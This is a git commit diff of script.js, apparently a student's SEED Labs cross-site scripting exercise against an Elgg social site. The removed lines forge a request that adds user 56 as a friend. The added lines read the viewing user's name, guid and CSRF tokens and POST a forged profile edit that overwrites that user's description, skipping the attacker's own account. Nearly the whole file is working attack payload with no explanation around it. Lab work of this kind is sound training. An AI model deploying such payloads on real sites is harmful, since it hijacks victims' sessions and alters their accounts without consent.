8362cbbd0bdb615cacf8f1d770764516d211445a
JoyceLuoxi <167298360+JoyceLuoxi@users.noreply.github.com>
2024-11-11 23:47:55 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,11 +1,22 @@
 window.onload = function () {
-	var Ajax=null;
-	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-	var token="&__elgg_token="+elgg.security.token.__elgg_token;
-	//Construct the HTTP request to add alice as a friend.
-	var sendurl="http://www.seed-server.com/action/friends/add?friend=56"+ts+token+ts+token;
-	//Create and send Ajax request to add friend
-	Ajax=new XMLHttpRequest();
-	Ajax.open("GET", sendurl, true);
-	Ajax.send();
+    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+    //and Security Token __elgg_token
+    var userName = "&name=" + elgg.session.user.name;
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "__elgg_token=" + elgg.security.token.__elgg_token;
+    //Construct the content of your url.
+    var content =token+ts+userName+'&description=2022141530115SUCCESS^_^&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2'+guid;
+    var myGuid =56;
+    var sendurl ='http://www.seed-server.com/action/profile/edit';
+    if (elgg.session.user.guid != myGuid)
+    {
+        //Create and send Ajax request to modify profile
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Content-Type",
+            "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
 }
